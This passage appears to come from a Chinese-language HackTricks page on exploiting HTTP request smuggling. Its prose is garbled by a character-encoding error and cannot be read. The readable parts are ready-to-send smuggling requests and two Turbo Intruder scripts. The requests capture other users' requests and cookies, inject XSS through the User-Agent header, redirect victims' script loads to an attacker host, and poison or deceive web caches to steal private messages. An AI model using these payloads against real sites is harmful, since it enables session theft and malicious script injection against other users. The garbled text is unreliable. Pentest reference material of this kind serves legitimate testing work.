å¦‚æœæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå°†ä¿å­˜ä¸€ä¸ªå‚æ•°çš„å†…å®¹çš„POSTè¯·æ±‚ï¼Œæ‚¨å¯ä»¥å°†ä»¥ä¸‹è¯·æ±‚é™„åŠ ä¸ºè¯¥å‚æ•°çš„å€¼ï¼Œä»¥ä¾¿å­˜å‚¨ä¸‹ä¸€ä¸ªå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼š

`POST / HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 319`\
`Connection: keep-alive`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`POST /post/comment HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Length: 659`\
`Content-Type: application/x-www-form-urlencoded`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
\`\`\
`csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=`

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ**å‚æ•°commentçš„å€¼å°†ä¿å­˜åœ¨é¡µé¢ä¸Šå…¬å¼€å¯è§çš„å¸–å­çš„è¯„è®º**ä¸­ï¼Œå› æ­¤å°†å‡ºç°ä¸€ä¸ªè¯„è®ºï¼Œå…¶ä¸­åŒ…å«ä¸‹ä¸€ä¸ªè¯·æ±‚çš„å†…å®¹ã€‚

_è¿™ç§æŠ€æœ¯çš„ä¸€ä¸ªé™åˆ¶æ˜¯ï¼Œå®ƒé€šå¸¸åªèƒ½æ•è·ç›´åˆ°é€‚ç”¨äºåŠ«æŒè¯·æ±‚çš„å‚æ•°åˆ†éš”ç¬¦çš„æ•°æ®ã€‚å¯¹äºURLç¼–ç çš„è¡¨å•æäº¤ï¼Œè¿™å°†æ˜¯`&`å­—ç¬¦ï¼Œè¿™æ„å‘³ç€ä»å—å®³ç”¨æˆ·çš„è¯·æ±‚ä¸­å­˜å‚¨çš„å†…å®¹å°†åœ¨ç¬¬ä¸€ä¸ª`&`å¤„ç»“æŸï¼Œè¿™ç”šè‡³å¯èƒ½å‡ºç°åœ¨æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­ã€‚_

è¿˜è¦æ³¨æ„ï¼Œè¿™ç§æŠ€æœ¯ä¹Ÿå¯ä»¥åˆ©ç”¨TE.CLæ¼æ´ï¼Œä½†è¯·æ±‚å¿…é¡»ä»¥`search=\r\n0`ç»“å°¾ã€‚ç„¶è€Œï¼Œæ— è®ºæ¢è¡Œç¬¦æ˜¯ä»€ä¹ˆï¼Œå€¼éƒ½å°†é™„åŠ åˆ°æœç´¢å‚æ•°ã€‚
### ä½¿ç”¨HTTPè¯·æ±‚èµ°ç§æ¥åˆ©ç”¨åå°„å‹XSSæ¼æ´

å¦‚æœç½‘é¡µè¿˜**å­˜åœ¨åå°„å‹XSSæ¼æ´**ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨HTTPè¯·æ±‚èµ°ç§æ¥æ”»å‡»ç½‘é¡µçš„å®¢æˆ·ç«¯ã€‚ä»HTTPè¯·æ±‚èµ°ç§ä¸­åˆ©ç”¨åå°„å‹XSSæ¼æ´å…·æœ‰ä»¥ä¸‹ä¼˜åŠ¿ï¼š

* **æ— éœ€ä¸å—å®³ç”¨æˆ·è¿›è¡Œäº¤äº’**
* å¯ä»¥ç”¨äºåˆ©ç”¨è¯·æ±‚ä¸­çš„æŸäº›éƒ¨åˆ†çš„XSSè¡Œä¸ºï¼Œè¿™åœ¨æ­£å¸¸çš„åå°„å‹XSSæ”»å‡»ä¸­**æ— æ³•è½»æ˜“æ§åˆ¶**ï¼Œä¾‹å¦‚HTTPè¯·æ±‚å¤´ã€‚

å¦‚æœç½‘é¡µåœ¨User-Agentå¤´éƒ¨å­˜åœ¨åå°„å‹XSSæ¼æ´ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æœ‰æ•ˆè½½è·æ¥åˆ©ç”¨å®ƒï¼š

`POST / HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0`\
`Cookie: session=Ro7YknOtbl3bxURHAAxZz84qj3PSMnSY`\
`Transfer-Encoding: chunked`\
`Connection: keep-alive`\
`Content-Length: 213`\
`Content-Type: application/x-www-form-urlencoded`\
``\ `0`\``\
`GET /post?postId=2 HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: "><script>alert(1)</script>`\
`Content-Length: 10`\
`Content-Type: application/x-www-form-urlencoded`\
\`\`\
`A=`

### ä½¿ç”¨HTTPè¯·æ±‚èµ°ç§å°†ç«™å†…é‡å®šå‘è½¬æ¢ä¸ºå¼€æ”¾é‡å®šå‘ <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

è®¸å¤šåº”ç”¨ç¨‹åºä¼šå°†ä¸€ä¸ªURLä¸Šçš„è¯·æ±‚é‡å®šå‘åˆ°å¦ä¸€ä¸ªURLï¼Œå¹¶å°†è¯·æ±‚çš„`Host`å¤´éƒ¨ä¸­çš„ä¸»æœºåæ”¾å…¥é‡å®šå‘URLä¸­ã€‚ä¸€ä¸ªä¾‹å­æ˜¯Apacheå’ŒIIS WebæœåŠ¡å™¨çš„é»˜è®¤è¡Œä¸ºï¼Œå…¶ä¸­å¯¹æ²¡æœ‰å°¾éƒ¨æ–œæ çš„æ–‡ä»¶å¤¹çš„è¯·æ±‚ä¼šè¢«é‡å®šå‘åˆ°åŒ…å«å°¾éƒ¨æ–œæ çš„åŒä¸€æ–‡ä»¶å¤¹ï¼š

`GET /home HTTP/1.1`\
`Host: normal-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://normal-website.com/home/`

è¿™ç§è¡Œä¸ºé€šå¸¸è¢«è®¤ä¸ºæ˜¯æ— å®³çš„ï¼Œä½†å®ƒå¯ä»¥åœ¨è¯·æ±‚èµ°ç§æ”»å‡»ä¸­è¢«åˆ©ç”¨ï¼Œå°†å…¶ä»–ç”¨æˆ·é‡å®šå‘åˆ°å¤–éƒ¨åŸŸã€‚ä¾‹å¦‚ï¼š

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 54`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: X`

èµ°ç§çš„è¯·æ±‚å°†è§¦å‘å¯¹æ”»å‡»è€…ç½‘ç«™çš„é‡å®šå‘ï¼Œè¿™å°†å½±å“ç”±åç«¯æœåŠ¡å™¨å¤„ç†çš„ä¸‹ä¸€ä¸ªç”¨æˆ·è¯·æ±‚ã€‚ä¾‹å¦‚ï¼š

`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: XGET /scripts/include.js HTTP/1.1`\
`Host: vulnerable-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://attacker-website.com/home/`

åœ¨è¿™é‡Œï¼Œç”¨æˆ·çš„è¯·æ±‚æ˜¯é’ˆå¯¹ç½‘ç«™ä¸Šçš„ä¸€ä¸ªé¡µé¢å¯¼å…¥çš„JavaScriptæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡è¿”å›è‡ªå·±çš„JavaScriptæ¥å®Œå…¨æ§åˆ¶å—å®³ç”¨æˆ·ã€‚

### ä½¿ç”¨HTTPè¯·æ±‚èµ°ç§è¿›è¡ŒWebç¼“å­˜æ±¡æŸ“ <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

å¦‚æœ**å‰ç«¯åŸºç¡€è®¾æ–½çš„ä»»ä½•éƒ¨åˆ†æ‰§è¡Œå†…å®¹ç¼“å­˜**ï¼ˆé€šå¸¸æ˜¯ä¸ºäº†æé«˜æ€§èƒ½ï¼‰ï¼Œé‚£ä¹ˆ**å¯èƒ½ä¼šé€šè¿‡ä¿®æ”¹æœåŠ¡å™¨çš„å“åº”æ¥æ±¡æŸ“ç¼“å­˜**ã€‚

æˆ‘ä»¬å·²ç»çœ‹åˆ°å¦‚ä½•å°†æœåŠ¡å™¨çš„é¢„æœŸè¿”å›å€¼ä¿®æ”¹ä¸º404ï¼ˆåœ¨[åŸºæœ¬ç¤ºä¾‹](./#basic-examples)ä¸­ï¼‰ï¼Œç±»ä¼¼åœ°ï¼Œæ‚¨å¯ä»¥ä½¿æœåŠ¡å™¨åœ¨è¢«æ±¡æŸ“çš„è¯·æ±‚è¦æ±‚`/static/include.js`æ—¶è¿”å›`/index.html`çš„å†…å®¹ã€‚è¿™æ ·ï¼Œ`/static/include.js`çš„å†…å®¹å°†ä¸`/index.html`çš„å†…å®¹ä¸€èµ·ç¼“å­˜ï¼Œä½¿å¾—å®¢æˆ·ç«¯æ— æ³•è®¿é—®`/static/include.js`ï¼ˆæ‹’ç»æœåŠ¡ï¼Ÿï¼‰ã€‚

è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨æ‰¾åˆ°äº†ä¸€äº›**å¼€æ”¾é‡å®šå‘**æˆ–ä¸€äº›**ç«™å†…é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘**ï¼ˆä¸Šä¸€èŠ‚ï¼‰ï¼Œè¿™å°†å˜å¾—æ›´åŠ æœ‰è¶£ã€‚å› ä¸ºæ‚¨å¯ä»¥**æ›´æ”¹`/static/include.js`çš„ç¼“å­˜å€¼**ä¸ºæ‚¨æ§åˆ¶çš„è„šæœ¬çš„å€¼ï¼ˆå¯¹æ‰€æœ‰å°è¯•ä¸‹è½½`/static/include.js`æ–°ç‰ˆæœ¬çš„å®¢æˆ·ç«¯è¿›è¡Œ**é€šç”¨XSSæ”»å‡»**ï¼‰ã€‚

åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œå°†å±•ç¤ºå¦‚ä½•åˆ©ç”¨**ç¼“å­˜æ±¡æŸ“+ç«™å†…é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘**æ¥ä¿®æ”¹`/static/include.js`ç¼“å­˜çš„å†…å®¹ï¼Œä»¥æä¾›ç”±æ”»å‡»è€…æ§åˆ¶çš„JSä»£ç ï¼š

`POST / HTTP/1.1`\
`Host: vulnerable.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 124`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /post/next?postId=3 HTTP/1.1`\
`Host: attacker.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 10`\
\`\`\
`x=1`

è¯·æ³¨æ„åµŒå…¥çš„è¯·æ±‚æ­£åœ¨è¯·æ±‚`/post/next?postId=3`ã€‚è¿™ä¸ªè¯·æ±‚å°†è¢«é‡å®šå‘åˆ°`/post?postId=4`ï¼Œå¹¶ä¸”å°†ä½¿ç”¨Hostå¤´éƒ¨çš„å€¼æ¥æŒ‡ç¤ºåŸŸåã€‚å› æ­¤ï¼Œæ‚¨å¯ä»¥**ä¿®æ”¹Hostå¤´éƒ¨**ä»¥æŒ‡å‘æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œé‡å®šå‘å°†ä½¿ç”¨è¯¥åŸŸåï¼ˆç«™å†…é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘ï¼‰ã€‚

ç„¶åï¼Œåœ¨**æ±¡æŸ“å¥—æ¥å­—**ä¹‹åï¼Œæ‚¨éœ€è¦å‘é€ä¸€ä¸ª**GETè¯·æ±‚**åˆ°\*\*`/static/include.js`\*\*ï¼Œè¿™ä¸ªè¯·æ±‚å°†è¢«**ç«™å†…é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘**è¯·æ±‚æ±¡æŸ“ï¼Œå¹¶å°†**è·å–æ”»å‡»è€…æ§åˆ¶çš„è„šæœ¬çš„å†…å®¹**ã€‚

ä¸‹æ¬¡æœ‰äººè¯·æ±‚`/static/include.js`æ—¶ï¼Œå°†æä¾›æ”»å‡»è€…è„šæœ¬çš„ç¼“å­˜å†…å®¹ï¼ˆé€šç”¨XSSæ”»å‡»ï¼‰ã€‚
### ä½¿ç”¨HTTPè¯·æ±‚èµ°ç§è¿›è¡ŒWebç¼“å­˜æ¬ºéª— <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Webç¼“å­˜æ±¡æŸ“å’ŒWebç¼“å­˜æ¬ºéª—æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ**
>
> * åœ¨**Webç¼“å­˜æ±¡æŸ“**ä¸­ï¼Œæ”»å‡»è€…ä¼šå¯¼è‡´åº”ç”¨ç¨‹åºå°†ä¸€äº›æ¶æ„å†…å®¹å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œå¹¶ä¸”è¿™äº›å†…å®¹ä¼šä»ç¼“å­˜ä¸­æä¾›ç»™å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·ã€‚
> * åœ¨**Webç¼“å­˜æ¬ºéª—**ä¸­ï¼Œæ”»å‡»è€…ä¼šå¯¼è‡´åº”ç”¨ç¨‹åºå°†å±äºå¦ä¸€ä¸ªç”¨æˆ·çš„æŸäº›æ•æ„Ÿå†…å®¹å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œç„¶åæ”»å‡»è€…ä»ç¼“å­˜ä¸­æ£€ç´¢æ­¤å†…å®¹ã€‚

åœ¨è¿™ç§å˜ä½“ä¸­ï¼Œæ”»å‡»è€…èµ°ç§äº†ä¸€ä¸ªè¯·æ±‚ï¼Œè¿”å›ä¸€äº›æ•æ„Ÿçš„ç”¨æˆ·ç‰¹å®šå†…å®¹ã€‚ä¾‹å¦‚ï¼š

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`

å¦‚æœ**æ¯’è¯åˆ°è¾¾æ­£åœ¨è®¿é—®æŸäº›é™æ€å†…å®¹**ï¼ˆå¦‚`/someimage.png`ï¼‰çš„å®¢æˆ·ç«¯ï¼Œè¯¥å†…å®¹å°†è¢«**ç¼“å­˜**ã€‚å—å®³è€…çš„`/private/messages`å†…å®¹å°†è¢«ç¼“å­˜åœ¨`/someimage.png`ä¸­ï¼Œæ”»å‡»è€…å°†èƒ½å¤Ÿçªƒå–è¿™äº›å†…å®¹ã€‚\
è¯·æ³¨æ„ï¼Œ**æ”»å‡»è€…ä¸çŸ¥é“å—å®³è€…è¯•å›¾è®¿é—®çš„é™æ€å†…å®¹**ï¼Œå› æ­¤æœ€å¥½çš„æ–¹æ³•å¯èƒ½æ˜¯æ‰§è¡Œæ”»å‡»ï¼Œç­‰å¾…å‡ ç§’é’Ÿï¼Œç„¶å**åŠ è½½æ‰€æœ‰**é™æ€å†…å®¹å¹¶**æœç´¢ç§äººæ•°æ®**ã€‚

### ä½¿ç”¨HTTPå“åº”ä¸åŒæ­¥æ­¦è£…HTTPè¯·æ±‚èµ°ç§

æ‚¨æ˜¯å¦å‘ç°äº†ä¸€äº›HTTPè¯·æ±‚èµ°ç§æ¼æ´ï¼Œä½†ä¸çŸ¥é“å¦‚ä½•åˆ©ç”¨å®ƒã€‚å°è¯•ä½¿ç”¨ä»¥ä¸‹å…¶ä»–åˆ©ç”¨æ–¹æ³•ï¼š

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Turbo intruderè„šæœ¬

### CL.TE

æ¥è‡ª[https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

æ¥è‡ªï¼š[https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## æ›´å¤šä¿¡æ¯

![](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[å›¾ç‰‡æ¥æº](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## å·¥å…·

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer)ï¼šè¿™ä¸ªå·¥å…·æ˜¯ä¸€ä¸ªåŸºäºè¯­æ³•çš„HTTPæ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œç”¨äºæŸ¥æ‰¾å¥‡æ€ªçš„è¯·æ±‚æ¬ºéª—å·®å¼‚ã€‚

## å‚è€ƒèµ„æ–™

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
